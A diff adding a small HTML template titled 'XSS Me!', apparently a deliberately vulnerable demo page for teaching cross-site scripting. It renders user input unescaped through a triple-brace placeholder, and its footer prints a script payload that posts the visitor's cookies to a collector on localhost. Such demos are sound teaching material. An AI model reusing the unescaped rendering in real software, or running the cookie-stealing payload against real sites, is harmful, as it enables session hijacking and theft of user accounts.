@@ -1,0 +1,15 @@
+<html>
+    <head>
+        <title>
+            XSS Me!
+        </title>
+    </head>
+    <body>
+        {{{body}}}
+        <footer>
+            <p>Here's something you can try:</p>
+            <p>&lt;script&gt;var xhttp=new XMLHttpRequest();xhttp.open(&quot;POST&quot;, &quot;http://localhost:3001/cookies&quot;, true);xhttp.send(decodeURI(document.cookie));&lt;/script&gt;</p>
+            <p>Copy and paste this block into one of the inputs. This will grab all the cookies from the site and ship them off to some nameless, faceless server.</p>
+        </footer>
+    </body>
+</html>
